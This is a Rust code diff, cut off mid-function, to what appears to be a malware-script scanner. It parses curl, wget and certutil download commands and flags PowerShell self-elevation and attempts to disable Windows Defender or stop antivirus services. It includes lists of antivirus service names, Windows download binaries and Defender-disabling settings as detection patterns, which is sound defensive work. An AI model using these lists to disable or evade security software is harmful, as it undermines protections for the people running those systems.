@@ -1383,14 +4867,57 @@ fn scan_curl_style_compact_flags_deob_text(deobfuscated: &str, env: &mut Environ
     }
 }
 
+fn is_known_non_curl_compact_flag_host(cmd_base: &str) -> bool {
+    matches!(
+        cmd_base,
+        "powershell.exe"
+            | "pwsh.exe"
+            | "cmd.exe"
+            | "wscript.exe"
+            | "cscript.exe"
+            | "mshta.exe"
+            | "rundll32.exe"
+            | "regsvr32.exe"
+            | "certutil.exe"
+            | "bitsadmin.exe"
+            | "msiexec.exe"
+            | "explorer.exe"
+            | "hh.exe"
+    )
+}
+
 fn parse_curl_like_download(tokens: &[String]) -> Option<(String, Option<String>)> {
     let mut url: Option<String> = None;
     let mut dst: Option<String> = None;
+    let mut output_dir: Option<String> = None;
+    let mut remote_name = false;
     let mut i = 1;
     while i < tokens.len() {
         let raw_token = tokens[i].trim_matches(['"', '\'', ')']);
         let token = clean_command_url_token(raw_token);
         let lower = raw_token.to_ascii_lowercase();
+        if let Some(value) = short_option_cluster_output(raw_token, 'o') {
+            if value.is_empty() {
+                dst = tokens
+                    .get(i + 1)
+                    .map(|s| s.trim_matches(['"', '\'', ')']).to_string());
+                i += 2;
+            } else {
+                dst = Some(value.trim_matches(['"', '\'', ')']).to_string());
+                i += 1;
+            }
+            continue;
+        }
+        if short_option_cluster_remote_name(raw_token) {
+            remote_name = true;
+            i += 1;
+            continue;
+        }
+        if raw_token == "-O" || lower == "--remote-name" {
+            remote_name = true;
+            i += 1;
+            continue;
+        }
         if (lower == "-o" || lower == "--output") && tokens.get(i + 1).is_some() {
             dst = tokens
                 .get(i + 1)
@@ -1398,9 +4925,24 @@ fn parse_curl_like_download(tokens: &[String]) -> Option<(String, Option<String>
             i += 2;
             continue;
         }
-        if let Some(rest) = raw_token
-            .strip_prefix("--output=")
-            .or_else(|| raw_token.strip_prefix("--output:"))
+        if lower == "--output-dir" && tokens.get(i + 1).is_some() {
+            output_dir = tokens
+                .get(i + 1)
+                .map(|s| s.trim_matches(['"', '\'', ')']).to_string());
+            i += 2;
+            continue;
+        }
+        if let Some(rest) = strip_ascii_case_insensitive_prefix(raw_token, "--output-dir=")
+            .or_else(|| strip_ascii_case_insensitive_prefix(raw_token, "--output-dir:"))
+        {
+            if !rest.is_empty() {
+                output_dir = Some(rest.trim_matches(['"', '\'', ')']).to_string());
+            }
+            i += 1;
+            continue;
+        }
+        if let Some(rest) = strip_ascii_case_insensitive_prefix(raw_token, "--output=")
+            .or_else(|| strip_ascii_case_insensitive_prefix(raw_token, "--output:"))
         {
             if !rest.is_empty() {
                 dst = Some(rest.trim_matches(['"', '\'', ')']).to_string());
@@ -1415,15 +4957,127 @@ fn parse_curl_like_download(tokens: &[String]) -> Option<(String, Option<String>
                 continue;
             }
         }
-        if let Some(normalized) = normalize_liberal_url_token(token) {
+        if let Some(rest) = strip_ascii_case_insensitive_prefix(raw_token, "--url=")
+            .or_else(|| strip_ascii_case_insensitive_prefix(raw_token, "--url:"))
+        {
+            if let Some(normalized) = normalize_curl_url_token(clean_command_url_token(rest)) {
+                url = Some(normalized);
+            }
+            i += 1;
+            continue;
+        }
+        if curl_attached_value_flag_url(raw_token) {
+            i += 1;
+            continue;
+        }
+        if curl_value_flag(raw_token) || curl_empty_attached_value_flag(raw_token) {
+            i += 2;
+            continue;
+        }
+        if let Some(normalized) = normalize_curl_url_token(token) {
             url = Some(normalized);
         }
         i += 1;
     }
-    url.map(|u| (u, dst))
+    url.map(|u| {
+        let dst = dst.or_else(|| {
+            remote_name.then(|| {
+                url_basename(&u).map(|name| {
+                    output_dir
+                        .as_deref()
+                        .map(|dir| join_windows_path(dir, &name))
+                        .unwrap_or(name)
+                })
+            })?
+        });
+        (u, dst)
+    })
+}
+
+fn normalize_curl_url_token(token: &str) -> Option<String> {
+    normalize_liberal_url_token(token).or_else(|| normalize_schemeless_domain_path_token(token))
+}
+
+fn curl_value_flag(token: &str) -> bool {
+    matches!(
+        token,
+        "-d" | "-H" | "-X" | "-A" | "-e" | "-b" | "-c" | "-u" | "-x" | "-m" | "-T" | "-F"
+    ) || curl_value_long_flag(token)
+}
+
+fn curl_value_long_flag(token: &str) -> bool {
+    [
+        "--data",
+        "--data-ascii",
+        "--data-binary",
+        "--data-raw",
+        "--data-urlencode",
+        "--header",
+        "--request",
+        "--user-agent",
+        "--referer",
+        "--cookie",
+        "--cookie-jar",
+        "--user",
+        "--proxy",
+        "--connect-timeout",
+        "--max-time",
+        "--upload-file",
+        "--form",
+        "--form-string",
+        "--retry",
+        "--retry-delay",
+    ]
+    .iter()
+    .any(|flag| token.eq_ignore_ascii_case(flag))
+}
+
+fn curl_attached_value_flag_url(token: &str) -> bool {
+    let Some(delimiter) = token.find(['=', ':']) else {
+        return false;
+    };
+    let (flag, value_with_delimiter) = token.split_at(delimiter);
+    curl_value_long_flag(flag) && token_contains_liberal_url_scheme(&value_with_delimiter[1..])
+}
+
+fn curl_empty_attached_value_flag(token: &str) -> bool {
+    let Some(flag) = token.strip_suffix('=').or_else(|| token.strip_suffix(':')) else {
+        return false;
+    };
+    curl_value_long_flag(flag)
+}
+
+fn short_option_cluster_output(token: &str, output_flag: char) -> Option<&str> {
+    let cluster = token.strip_prefix('-')?;
+    if cluster.starts_with('-') || cluster.len() <= 1 {
+        return None;
+    }
+    let idx = cluster.find(output_flag)?;
+    Some(&cluster[idx + output_flag.len_utf8()..])
+}
+
+fn short_option_cluster_remote_name(token: &str) -> bool {
+    let Some(cluster) = token.strip_prefix('-') else {
+        return false;
+    };
+    !cluster.starts_with('-') && cluster.len() > 1 && cluster.contains('O')
+}
+
+fn strip_ascii_case_insensitive_prefix<'a>(s: &'a str, prefix: &str) -> Option<&'a str> {
+    if s.get(..prefix.len())
+        .is_some_and(|head| head.eq_ignore_ascii_case(prefix))
+    {
+        Some(&s[prefix.len()..])
+    } else {
+        None
+    }
 }
 
 fn parse_glued_curl_download(text: &str) -> Option<(String, Option<String>)> {
+    if first_url_token_is_curl_option_value(text) {
+        return None;
+    }
+
     let lower = text.to_ascii_lowercase();
     let scheme_pos = ["https://", "http://", "ftp://"]
         .iter()
@@ -1443,20 +5097,18 @@ fn parse_glued_curl_download(text: &str) -> Option<(String, Option<String>)> {
 
     let mut dst = None;
     let lowered = url.to_ascii_lowercase();
-    if let Some(idx) = lowered.find("--output=") {
+    if let Some(idx) = find_glued_curl_output_marker(&lowered, "--output=") {
         dst = Some(url[idx + "--output=".len()..].trim().to_string());
         url.truncate(idx);
-    } else if let Some(idx) = lowered.find("--output:") {
+    } else if let Some(idx) = find_glued_curl_output_marker(&lowered, "--output:") {
         dst = Some(url[idx + "--output:".len()..].trim().to_string());
         url.truncate(idx);
-    } else if let Some(idx) = lowered.find("--output") {
+    } else if let Some(idx) = find_glued_curl_output_marker(&lowered, "--output") {
         dst = Some(url[idx + "--output".len()..].trim().to_string());
         url.truncate(idx);
-    } else if let Some(idx) = lowered.find("-o") {
-        if idx > 0 {
-            dst = Some(url[idx + "-o".len()..].trim().to_string());
-            url.truncate(idx);
-        }
+    } else if let Some(idx) = find_glued_curl_output_marker(&lowered, "-o") {
+        dst = Some(url[idx + "-o".len()..].trim().to_string());
+        url.truncate(idx);
     }
 
     let url = url.trim_end_matches(['.', ',', ';', ':']).to_string();
@@ -1465,6 +5117,47 @@ fn parse_glued_curl_download(text: &str) -> Option<(String, Option<String>)> {
     } else {
         Some((url, dst))
     }
+}
+
+fn find_glued_curl_output_marker(text: &str, marker: &str) -> Option<usize> {
+    let mut search_start = 0;
+    while let Some(rel) = text[search_start..].find(marker) {
+        let idx = search_start + rel;
+        if idx > 0 && text.as_bytes()[idx - 1] == b'/' {
+            return Some(idx);
+        }
+        search_start = idx + marker.len();
+    }
+    None
+}
+
+fn first_url_token_is_curl_option_value(text: &str) -> bool {
+    let tokens = split_words(text);
+    let mut i = 1usize;
+    while i < tokens.len() {
+        let token = tokens[i].trim_matches(['"', '\'', ')']);
+        if curl_attached_value_flag_url(token) {
+            return true;
+        }
+        if curl_value_flag(token) || curl_empty_attached_value_flag(token) {
+            let Some(value) = tokens.get(i + 1) else {
+                return false;
+            };
+            return token_contains_liberal_url_scheme(value);
+        }
+        if token_contains_liberal_url_scheme(token) {
+            return false;
+        }
+        i += 1;
+    }
+    false
+}
+
+fn token_contains_liberal_url_scheme(token: &str) -> bool {
+    let lower = token.to_ascii_lowercase();
+    ["http://", "https://", "ftp://"]
+        .iter()
+        .any(|scheme| lower.contains(scheme))
 }
 
 fn parse_curl_output_dst(text: &str) -> Option<String> {
@@ -1512,7 +5205,7 @@ fn parse_curl_output_dst(text: &str) -> Option<String> {
 }
 
 fn looks_like_curl_url(url: &str) -> bool {
-    normalize_liberal_url_token(url).is_some_and(|url| {
+    normalize_curl_url_token(url).is_some_and(|url| {
         let Some((scheme, rest)) = url.split_once("://") else {
             return false;
         };
@@ -1543,11 +5236,28 @@ fn normalize_curl_text(curl_text: &str) -> std::borrow::Cow<'_, str> {
         out.insert(prefix_len, ' ');
     }
 
-    for needle in ["http://", "https://", "ftp://", "--output", "-o"] {
-        while let Some(pos) = out.find(needle) {
+    for needle in [
+        "http://",
+        "https://",
+        "ftp://",
+        "--output-dir",
+        "--output",
+        "-o",
+    ] {
+        let mut search_start = 0;
+        while let Some(rel) = out[search_start..].find(needle) {
+            let pos = search_start + rel;
             let is_scheme = matches!(needle, "http://" | "https://" | "ftp://");
-            if needle == "-o" && pos > 0 && out[..pos].ends_with('-') {
-                break;
+            if needle == "--output" && out[pos..].starts_with("--output-dir") {
+                search_start = pos + "--output-dir".len();
+                continue;
+            }
+            if needle == "-o"
+                && pos > 0
+                && !out[..pos].chars().last().is_some_and(|c| c.is_whitespace())
+            {
+                search_start = pos + needle.len();
+                continue;
             }
             if pos > 0 && !out[..pos].chars().last().is_some_and(|c| c.is_whitespace()) {
                 out.insert(pos, ' ');
@@ -1615,7 +5325,7 @@ fn scan_curl_redirect_deob_text(deobfuscated: &str, env: &mut Environment) {
 
     for line in deobfuscated.lines() {
         let lower = line.to_ascii_lowercase();
-        if !lower.contains("curl") || !contains_liberal_url_scheme(line) || !line.contains('>') {
+        if !lower.contains("curl") || !line.contains('>') {
             continue;
         }
         let Some(curl_pos) = lower.find("curl") else {
@@ -1669,7 +5379,7 @@ fn scan_curl_deob_text(deobfuscated: &str, env: &mut Environment) {
 
     for line in deobfuscated.lines() {
         let lower = line.to_ascii_lowercase();
-        if !lower.contains("curl") || !contains_liberal_url_scheme(line) {
+        if !lower.contains("curl") {
             continue;
         }
         let Some(curl_pos) = lower.find("curl") else {
@@ -1717,26 +5427,45 @@ fn parse_wget_like_download(tokens: &[String]) -> Option<(String, Option<String>
         let raw_token = tokens[i].trim_matches(['"', '\'', ')']);
         let token = clean_command_url_token(raw_token);
         let lower = raw_token.to_ascii_lowercase();
-        if lower == "-o" && tokens.get(i + 1).is_some() {
+        if let Some(rest) = short_option_cluster_output(raw_token, 'O') {
+            if rest.is_empty() {
+                dst = tokens
+                    .get(i + 1)
+                    .map(|s| s.trim_matches(['"', '\'', ')']).to_string());
+                i += 2;
+            } else {
+                dst = Some(rest.trim_matches(['"', '\'', ')']).to_string());
+                i += 1;
+            }
+            continue;
+        }
+        if raw_token == "-o" && tokens.get(i + 1).is_some() {
+            i += 2;
+            continue;
+        }
+        if raw_token == "-O" && tokens.get(i + 1).is_some() {
             dst = tokens
                 .get(i + 1)
                 .map(|s| s.trim_matches(['"', '\'', ')']).to_string());
             i += 2;
             continue;
         }
-        if let Some(rest) = raw_token
-            .strip_prefix("-O")
-            .or_else(|| raw_token.strip_prefix("-o"))
-        {
+        if lower == "--output-document" && tokens.get(i + 1).is_some() {
+            dst = tokens
+                .get(i + 1)
+                .map(|s| s.trim_matches(['"', '\'', ')']).to_string());
+            i += 2;
+            continue;
+        }
+        if let Some(rest) = raw_token.strip_prefix("-O") {
             if !rest.is_empty() && !rest.starts_with('-') {
                 dst = Some(rest.trim_matches(['"', '\'', ')']).to_string());
                 i += 1;
                 continue;
             }
         }
-        if let Some(rest) = raw_token
-            .strip_prefix("--output-document=")
-            .or_else(|| raw_token.strip_prefix("--output-document:"))
+        if let Some(rest) = strip_ascii_case_insensitive_prefix(raw_token, "--output-document=")
+            .or_else(|| strip_ascii_case_insensitive_prefix(raw_token, "--output-document:"))
         {
             if !rest.is_empty() {
                 dst = Some(rest.trim_matches(['"', '\'', ')']).to_string());
@@ -1744,11 +5473,46 @@ fn parse_wget_like_download(tokens: &[String]) -> Option<(String, Option<String>
             i += 1;
             continue;
         }
-        if lower == "-p" && tokens.get(i + 1).is_some() {
+        if raw_token == "-P" && tokens.get(i + 1).is_some() {
             dst = tokens
                 .get(i + 1)
                 .map(|s| s.trim_matches(['"', '\'', ')']).to_string());
             i += 2;
+            continue;
+        }
+        if let Some(rest) = raw_token.strip_prefix("-P") {
+            if !rest.is_empty() && !rest.starts_with('-') {
+                dst = Some(rest.trim_matches(['"', '\'', ')']).to_string());
+                i += 1;
+                continue;
+            }
+        }
+        if let Some(rest) = short_option_cluster_output(raw_token, 'P') {
+            if rest.is_empty() {
+                dst = tokens
+                    .get(i + 1)
+                    .map(|s| s.trim_matches(['"', '\'', ')']).to_string());
+                i += 2;
+            } else {
+                dst = Some(rest.trim_matches(['"', '\'', ')']).to_string());
+                i += 1;
+            }
+            continue;
+        }
+        if lower == "--directory-prefix" && tokens.get(i + 1).is_some() {
+            dst = tokens
+                .get(i + 1)
+                .map(|s| s.trim_matches(['"', '\'', ')']).to_string());
+            i += 2;
+            continue;
+        }
+        if let Some(rest) = strip_ascii_case_insensitive_prefix(raw_token, "--directory-prefix=")
+            .or_else(|| strip_ascii_case_insensitive_prefix(raw_token, "--directory-prefix:"))
+        {
+            if !rest.is_empty() {
+                dst = Some(rest.trim_matches(['"', '\'', ')']).to_string());
+            }
+            i += 1;
             continue;
         }
         if lower == "-i" && tokens.get(i + 1).is_some() {
@@ -1756,18 +5520,51 @@ fn parse_wget_like_download(tokens: &[String]) -> Option<(String, Option<String>
                 .get(i + 1)
                 .map(|s| clean_command_url_token(s.trim_matches(['"', '\'', ')'])))
                 .unwrap_or_default();
-            if let Some(normalized) = normalize_liberal_url_token(candidate) {
+            if let Some(normalized) = normalize_wget_url_token(candidate) {
                 url = Some(normalized);
             }
             i += 2;
             continue;
         }
-        if let Some(normalized) = normalize_liberal_url_token(token) {
+        if wget_value_flag(raw_token) {
+            i += 2;
+            continue;
+        }
+        if let Some(normalized) = normalize_wget_url_token(token) {
             url = Some(normalized);
         }
         i += 1;
     }
     url.map(|u| (u, dst))
+}
+
+fn normalize_wget_url_token(token: &str) -> Option<String> {
+    normalize_liberal_url_token(token).or_else(|| normalize_schemeless_domain_path_token(token))
+}
+
+fn wget_value_flag(token: &str) -> bool {
+    matches!(token, "-e" | "-U")
+        || [
+            "--execute",
+            "--header",
+            "--user-agent",
+            "--referer",
+            "--post-data",
+            "--post-file",
+            "--body-data",
+            "--body-file",
+            "--method",
+            "--load-cookies",
+            "--save-cookies",
+            "--proxy-user",
+            "--proxy-password",
+            "--bind-address",
+            "--ca-certificate",
+            "--certificate",
+            "--private-key",
+        ]
+        .iter()
+        .any(|flag| token.eq_ignore_ascii_case(flag))
 }
 
 fn scan_wget_deob_text(deobfuscated: &str, env: &mut Environment) {
@@ -1782,9 +5579,7 @@ fn scan_wget_deob_text(deobfuscated: &str, env: &mut Environment) {
 
     for line in deobfuscated.lines() {
         let lower = line.to_ascii_lowercase();
-        if !contains_liberal_url_scheme(line)
-            || (!lower.contains("wget") && !lower.contains("get.exe"))
-        {
+        if !lower.contains("wget") && !lower.contains("get.exe") {
             continue;
         }
         let wget_pos = lower
@@ -1829,17 +5624,22 @@ fn scan_certutil_urlcache_deob_text(deobfuscated: &str, env: &mut Environment) {
 
     for line in deobfuscated.lines() {
         let lower = line.to_ascii_lowercase();
-        if !lower.contains("-urlcache") || !contains_liberal_url_scheme(line) {
+        if !lower.contains("-urlcache")
+            && !lower.contains("/urlcache")
+            && !lower.contains("-verifyctl")
+            && !lower.contains("/verifyctl")
+        {
             continue;
         }
         let tokens = split_words(line);
         let Some(url_idx) = tokens.iter().position(|token| {
             let token = clean_command_url_token(token);
-            looks_like_liberal_url(token)
+            normalize_certutil_urlcache_token(token).is_some()
         }) else {
             continue;
         };
-        let Some(url) = normalize_liberal_url_token(clean_command_url_token(&tokens[url_idx]))
+        let Some(url) =
+            normalize_certutil_urlcache_token(clean_command_url_token(&tokens[url_idx]))
         else {
             continue;
         };
@@ -1849,11 +5649,15 @@ fn scan_certutil_urlcache_deob_text(deobfuscated: &str, env: &mut Environment) {
         let dst = tokens
             .iter()
             .skip(url_idx + 1)
-            .find(|token| !token.starts_with('-'))
+            .find(|token| !token.starts_with('-') && !token.starts_with('/'))
             .map(|token| token.trim_matches(['"', '\'', ')']).to_string())
             .unwrap_or_default();
         env.traits.push(Trait::CertutilDownload { url, dst });
     }
+}
+
+fn normalize_certutil_urlcache_token(token: &str) -> Option<String> {
+    normalize_liberal_url_token(token).or_else(|| normalize_schemeless_domain_path_token(token))
 }
 
 fn scan_echoed_curl_deob_text(deobfuscated: &str, env: &mut Environment) {
@@ -1906,26 +5710,50 @@ fn scan_echoed_curl_deob_text(deobfuscated: &str, env: &mut Environment) {
 fn scan_self_elevation(deobfuscated: &str, env: &mut Environment) {
     use once_cell::sync::Lazy;
     use regex::Regex;
+    if !has_self_elevation_atom(deobfuscated) {
+        return;
+    }
+
     // Anchor on `Start-Process` (or `saps` alias). Lazy match the body up
     // to `-Verb runas` so we capture the target+args regardless of order.
     static SELF_ELEV_RE: Lazy<Regex> = Lazy::new(|| {
         Regex::new(
-            r#"(?is)\b(?:Start-Process|saps)\b([^\n;|&]{0,300}?)-Verb\s+["']?runas["']?([^\n;|&]{0,300})"#,
+            r#"(?is)\b(?:Start-Process|saps)\b([^\n;|&]{0,300}?)-Verb(?:\s+|[:=])["']?runas["']?([^\n;|&]{0,300})"#,
         )
         .expect("self-elev regex")
     });
     // rust regex doesn't support backreferences — match each quote style
     // explicitly. -FilePath accepts unquoted, single-, or double-quoted.
-    static FILEPATH_DQ_RE: Lazy<Regex> =
-        Lazy::new(|| Regex::new(r#"(?i)-FilePath\s+"([^"]+)""#).expect("filepath-dq regex"));
-    static FILEPATH_SQ_RE: Lazy<Regex> =
-        Lazy::new(|| Regex::new(r#"(?i)-FilePath\s+'([^']+)'"#).expect("filepath-sq regex"));
-    static FILEPATH_BARE_RE: Lazy<Regex> =
-        Lazy::new(|| Regex::new(r#"(?i)-FilePath\s+([^\s'"]+)"#).expect("filepath-bare regex"));
-    static ARGLIST_DQ_RE: Lazy<Regex> =
-        Lazy::new(|| Regex::new(r#"(?is)-ArgumentList\s+"(.+?)""#).expect("arglist-dq regex"));
-    static ARGLIST_SQ_RE: Lazy<Regex> =
-        Lazy::new(|| Regex::new(r#"(?is)-ArgumentList\s+'(.+?)'"#).expect("arglist-sq regex"));
+    static FILEPATH_DQ_RE: Lazy<Regex> = Lazy::new(|| {
+        Regex::new(r#"(?i)-(?:FilePath|FilePat|FilePa|FileP|File|Fil|Fi|F)(?:\s+|[:=])"([^"]+)""#)
+            .expect("filepath-dq regex")
+    });
+    static FILEPATH_SQ_RE: Lazy<Regex> = Lazy::new(|| {
+        Regex::new(r#"(?i)-(?:FilePath|FilePat|FilePa|FileP|File|Fil|Fi|F)(?:\s+|[:=])'([^']+)'"#)
+            .expect("filepath-sq regex")
+    });
+    static FILEPATH_BARE_RE: Lazy<Regex> = Lazy::new(|| {
+        Regex::new(r#"(?i)-(?:FilePath|FilePat|FilePa|FileP|File|Fil|Fi|F)(?:\s+|[:=])([^\s'"]+)"#)
+            .expect("filepath-bare regex")
+    });
+    static ARGLIST_DQ_RE: Lazy<Regex> = Lazy::new(|| {
+        Regex::new(
+            r#"(?is)-(?:ArgumentList|ArgumentLis|ArgumentLi|ArgumentL|Arguments|Argument|Argumen|Argume|Argum|Argu|Args|Arg|Ar|A)(?:\s+|[:=])"(.+?)""#,
+        )
+        .expect("arglist-dq regex")
+    });
+    static ARGLIST_SQ_RE: Lazy<Regex> = Lazy::new(|| {
+        Regex::new(
+            r#"(?is)-(?:ArgumentList|ArgumentLis|ArgumentLi|ArgumentL|Arguments|Argument|Argumen|Argume|Argum|Argu|Args|Arg|Ar|A)(?:\s+|[:=])'(.+?)'"#,
+        )
+        .expect("arglist-sq regex")
+    });
+    static ARGLIST_BARE_RE: Lazy<Regex> = Lazy::new(|| {
+        Regex::new(
+            r#"(?i)-(?:ArgumentList|ArgumentLis|ArgumentLi|ArgumentL|Arguments|Argument|Argumen|Argume|Argum|Argu|Args|Arg|Ar|A)(?:\s+|[:=])([^\s'"`;|&]+)"#,
+        )
+        .expect("arglist-bare regex")
+    });
     for caps in SELF_ELEV_RE.captures_iter(deobfuscated) {
         let before = caps.get(1).map(|m| m.as_str()).unwrap_or("");
         let after = caps.get(2).map(|m| m.as_str()).unwrap_or("");
@@ -1953,18 +5781,47 @@ fn scan_self_elevation(deobfuscated: &str, env: &mut Environment) {
         let args = ARGLIST_DQ_RE
             .captures(&combined)
             .or_else(|| ARGLIST_SQ_RE.captures(&combined))
+            .or_else(|| ARGLIST_BARE_RE.captures(&combined))
             .and_then(|c| c.get(1).map(|m| m.as_str().to_string()));
         // Dedup
         if env.traits.iter().any(|t| {
             matches!(
                 t,
-                crate::traits::Trait::SelfElevation { target: tg, .. } if tg == &target
+                crate::traits::Trait::SelfElevation {
+                    target: tg,
+                    args: existing_args,
+                } if tg == &target && existing_args.as_deref() == args.as_deref()
             )
         }) {
             continue;
         }
         env.traits
             .push(crate::traits::Trait::SelfElevation { target, args });
+    }
+}
+
+fn has_self_elevation_atom(text: &str) -> bool {
+    contains_ascii_case_insensitive_atom(text, b"runas")
+        && (contains_ascii_case_insensitive_atom(text, b"start-process")
+            || contains_ascii_case_insensitive_atom(text, b"saps"))
+}
+
+#[cfg(test)]
+mod self_elevation_prefilter_tests {
+    use super::has_self_elevation_atom;
+
+    #[test]
+    fn prefilter_allows_start_process_runas_shapes() {
+        assert!(has_self_elevation_atom(
+            "Start-Process powershell.exe -Verb RunAs"
+        ));
+        assert!(has_self_elevation_atom("saps cmd.exe -Verb runas"));
+    }
+
+    #[test]
+    fn prefilter_blocks_start_process_without_runas() {
+        assert!(!has_self_elevation_atom("Start-Process calc.exe"));
+        assert!(!has_self_elevation_atom("runas /user:admin cmd.exe"));
     }
 }
 
@@ -1989,6 +5846,11 @@ fn scan_self_elevation(deobfuscated: &str, env: &mut Environment) {
 fn scan_defender_evasion(deobfuscated: &str, env: &mut Environment) {
     use once_cell::sync::Lazy;
     use regex::Regex;
+    let lower = deobfuscated.to_ascii_lowercase();
+    if !has_defender_evasion_atom_lower(&lower) {
+        return;
+    }
+
     const SECURITY_PRODUCT_PATTERN: &str = r"Trend Micro|Windows Defender|Microsoft Defender|Sophos|Kaspersky|Symantec|McAfee|Avast|AVG|ESET|Malwarebytes|CrowdStrike|SentinelOne|CarbonBlack|Cylance|Bitdefender";
     const SECURITY_SERVICE_PATTERN: &str = r"MBAMService|MBAMScheduler|ekrn|egui|AVP[0-9.]*|KSDE[0-9.]*|McAWFwk|MSK80Service|McAPExe|McBootDelayStartSvc|mccspsvc|mfefire|McMPFSvc|mcpltsvc|McProxy|McODS|mfemms|McAfee SiteAdvisor Service|mfevtp|McNaiAnn|NortonSecurity|SBAMSvc|ZillyaAVAuxSvc|ZillyaAVCoreSvc|QHActiveDefense|avast! Antivirus|avast! Firewall|AVG Antivirus|AntiVirMailService|AntiVirService|Avira\.ServiceHost|AntiVirWebService|AntiVirSchedulerService|vsservppl|ProductAgentService|vsserv|updatesrv|cmdAgent|cmdvirth|DragonUpdater|PEFService|SentinelAgent|CSFalconService";
     const SECURITY_STARTUP_PATTERN: &str = r"AvastUI\.exe|QHSafeTray|Zillya Antivirus|SBAMTray|SBRegRebootCleaner|egui|IseUI|COMODO Internet Security|ClamWin|Avira SystrayStartTrigger|AVGUI\.exe|SUPERAntiSpyware|Malwarebytes|Windows Defender|SecurityHealth|ESET|McAfee|Norton|Symantec";
@@ -2075,6 +5937,23 @@ fn scan_defender_evasion(deobfuscated: &str, env: &mut Environment) {
         Regex::new(r#"(?i)EtwEventWrite|System\.Diagnostics\.Eventing\.EventProvider"#)
             .expect("etw-patch")
     });
+    let defender_profile_enabled =
+        std::env::var_os("HARRINGTON_PROFILE_DEFENDER_EVASION").is_some();
+    macro_rules! profile_defender_group {
+        ($stage:literal, $body:block) => {{
+            let profile_start = defender_profile_enabled.then(std::time::Instant::now);
+            let result = $body;
+            if let Some(profile_start) = profile_start {
+                eprintln!(
+                    "harrington_profile_defender_evasion stage={} delta_ms={} bytes={}",
+                    $stage,
+                    profile_start.elapsed().as_millis(),
+                    deobfuscated.len()
+                );
+            }
+            result
+        }};
+    }
     let mut push = |kind: &str, target: String| {
         let target = target
             .trim_matches(|c: char| c == '\'' || c == '"')
@@ -2092,165 +5971,510 @@ fn scan_defender_evasion(deobfuscated: &str, env: &mut Environment) {
             target,
         });
     };
-    for caps in EXCLUSION_PATH_DQ
-        .captures_iter(deobfuscated)
-        .chain(EXCLUSION_PATH_SQ.captures_iter(deobfuscated))
-        .chain(EXCLUSION_PATH_BARE.captures_iter(deobfuscated))
+    if lower.contains("add-mppreference") || lower.contains("set-mppreference") {
+        profile_defender_group!("mp_preference", {
+            for caps in EXCLUSION_PATH_DQ
+                .captures_iter(deobfuscated)
+                .chain(EXCLUSION_PATH_SQ.captures_iter(deobfuscated))
+                .chain(EXCLUSION_PATH_BARE.captures_iter(deobfuscated))
+            {
+                let kind = format!(
+                    "exclusion-{}",
+                    caps.get(1)
+                        .map(|m| m.as_str().to_ascii_lowercase())
+                        .unwrap_or_default()
+                );
+                let target = caps
+                    .get(2)
+                    .map(|m| m.as_str().to_string())
+                    .unwrap_or_default();
+                push(&kind, target);
+            }
+
+            for caps in DISABLE_RE.captures_iter(deobfuscated) {
+                let opt = caps
+                    .get(1)
+                    .map(|m| m.as_str().to_ascii_lowercase())
+                    .unwrap_or_default();
+                let val = caps
+                    .get(2)
+                    .map(|m| m.as_str().to_string())
+                    .unwrap_or_default();
+                // Only flag the disabling forms — `$true` / `1` / `Disabled` /
+                // `2` (SubmitSamplesConsent=2 = never submit). Skip enabling
+                // values like `$false` to avoid false positives in remediation
+                // scripts that turn protections back on.
+                let val_lc = val.to_ascii_lowercase();
+                let disabling = matches!(
+                    (opt.as_str(), val_lc.as_str()),
+                    ("disablerealtimemonitoring", "$true" | "1" | "true")
+                        | ("disablebehaviormonitoring", "$true" | "1" | "true")
+                        | ("disableioavprotection", "$true" | "1" | "true")
+                        | ("disableblockatfirstseen", "$true" | "1" | "true")
+                        | ("disableprivacymode", "$true" | "1" | "true")
+                        | ("disablescriptscanning", "$true" | "1" | "true")
+                        | ("mapsreporting", "disabled" | "0")
+                ) || (opt == "submitsamplesconsent"
+                    && (val_lc == "2" || val_lc == "never"));
+                if disabling {
+                    push(&format!("setmp-{opt}"), val);
+                }
+            }
+        });
+    }
+
+    if has_defender_service_process_atom_lower(&lower) {
+        profile_defender_group!("service_process", {
+            for caps in SC_DEFENDER_RE.captures_iter(deobfuscated) {
+                let verb = caps
+                    .get(1)
+                    .map(|m| m.as_str().to_ascii_lowercase())
+                    .unwrap_or_default();
+                let svc = caps
+                    .get(2)
+                    .map(|m| m.as_str().to_string())
+                    .unwrap_or_default();
+                push(&format!("sc-{verb}"), svc);
+            }
+            for caps in TASKKILL_SECURITY_RE.captures_iter(deobfuscated) {
+                let process = caps
+                    .get(1)
+                    .map(|m| format!("{}.exe", m.as_str()))
+                    .unwrap_or_default();
+                push("taskkill-security-process", process);
+            }
+            for caps in SECURITY_BINARY_TAKEOWN_RE.captures_iter(deobfuscated) {
+                let binary = caps
+                    .get(1)
+                    .map(|m| format!("{}.exe", m.as_str()))
+                    .unwrap_or_default();
+                push("security-binary-takeown", binary);
+            }
+            for caps in SECURITY_BINARY_ICACLS_RE.captures_iter(deobfuscated) {
+                let binary = caps
+                    .get(1)
+                    .map(|m| format!("{}.exe", m.as_str()))
+                    .unwrap_or_default();
+                push("security-binary-acl-grant", binary);
+            }
+            for caps in SECURITY_BINARY_RENAME_RE.captures_iter(deobfuscated) {
+                let binary = caps
+                    .get(1)
+                    .map(|m| format!("{}.exe", m.as_str()))
+                    .unwrap_or_default();
+                push("security-binary-rename", binary);
+            }
+        });
+    }
+
+    if has_defender_scheduled_registry_firewall_atom_lower(&lower) {
+        profile_defender_group!("scheduled_registry_firewall", {
+            for line in deobfuscated.lines() {
+                let lower = line.to_ascii_lowercase();
+                if !lower.contains("schtasks")
+                    || !lower.contains("/change")
+                    || !lower.contains("/disable")
+                    || (!lower.contains("windows defender") && !lower.contains("exploitguard"))
+                {
+                    continue;
+                }
+                let task_name = SCHTASKS_TN_RE
+                    .captures(line)
+                    .and_then(|caps| caps.get(1).or_else(|| caps.get(2)))
+                    .map(|m| m.as_str().to_string())
+                    .unwrap_or_else(|| line.trim().chars().take(160).collect());
+                push("scheduled-task-disable", task_name);
+            }
+            for caps in DEFENDER_SERVICE_START_DISABLED_RE.captures_iter(deobfuscated) {
+                let service = caps
+                    .get(1)
+                    .map(|m| m.as_str().to_string())
+                    .unwrap_or_default();
+                push("service-start-disabled", service);
+            }
+            for caps in ATTACHMENT_POLICY_WEAKEN_RE.captures_iter(deobfuscated) {
+                let value_name = caps.get(1).map(|m| m.as_str()).unwrap_or_default();
+                let data = caps
+                    .get(2)
+                    .map(|m| m.as_str().trim_matches('"').to_ascii_lowercase())
+                    .unwrap_or_default();
+                let weakens = match value_name.to_ascii_lowercase().as_str() {
